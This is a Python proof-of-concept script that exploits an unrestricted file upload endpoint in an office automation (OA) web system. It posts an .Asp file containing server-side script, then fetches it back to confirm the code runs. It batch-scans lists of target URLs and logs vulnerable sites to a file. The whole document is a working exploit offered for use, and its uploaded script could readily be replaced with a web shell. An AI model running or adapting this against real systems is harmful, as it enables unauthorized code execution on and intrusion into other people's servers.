import sys
import argparse
import requests
import json
def checkVuln(url):
    vulnurl = url+"/OA/api/2.0/Common/AttachFile/UploadFile"
    data = """------WebKitFormBoundaryNe8DcVuv1vEUWDaR\r\nContent-Disposition: form-data; name="upload";filename="123.Asp"\r\n\r\n<% response.write("kailyou") %>\r\n------WebKitFormBoundaryNe8DcVuv1vEUWDaR--"""
    headers = {
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryNe8DcVuv1vEUWDaR',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
    }
    try:
        res1 = requests.post(vulnurl, data=data, headers=headers, verify=False, timeout=10)
        x = res1.json()
        z=x['err_code']
        if z==0:
            y = x['result'][0]['fileTargetName']
            Okurl = url + "/OA/upfiles//temp/" + y
            res2 = requests.get(Okurl, verify=False, headers=headers, timeout=10)
            if res1.status_code == 200 and 'kailyou' in res2.text:
                print(f"[+]当前网址存在漏洞:{url}")
                with open("vuln3.txt", "a+") as f:
                    f.write(Okurl + "\n")
            else:
                print("[-]当前网站不存在漏洞")
        else:
            print("[-]当前网站不存在漏洞")
    except Exception as e:
        print("[-]当前网站存在连接问题")

def batchCheck(filename):
    with open(filename,"r") as f:
        for readline in f.readlines():
            url=readline.replace('\n','')
            checkVuln(url)
def banner():
    bannerinfo='''_________ _______  _______  _        _______  _______  _______
\__   __/(  ___  )(  ___  )( \      (  ____ )(  ___  )(  ____ \
   ) (   | (   ) || (   ) || (      | (    )|| (   ) || (    \/
   | |   | |   | || |   | || |      | (____)|| |   | || |
   | |   | |   | || |   | || |      |  _____)| |   | || |
   | |   | |   | || |   | || |      | (      | |   | || |
   | |   | (___) || (___) || (____/\| )      | (___) || (____/\
   )_(   (_______)(_______)(_______/|/       (_______)(_______/


'''
    print(bannerinfo)
    print("toolpoc".center(50,'*'))
    print(f"[+]{sys.argv[0]} --url http://www.xxx.com 进行单个url漏洞检测")
    print(f"[+]{sys.argv[0]} --file targeturl.txt 对文本中的url进行批量检测")
    print(f"[+]{sys.argv[0]} --help 查看帮助")
def main():
    parser=argparse.ArgumentParser(description='漏洞检测脚本')
    parser.add_argument('-u','--url',type=str,help='单个url')
    parser.add_argument('-f','--file',type=str,help='批量检测url')
    args=parser.parse_args()
    if args.url:
        checkVuln(args.url)
    elif args.file:
        batchCheck(args.file)
    else:
        banner()
if __name__ == '__main__':
    main()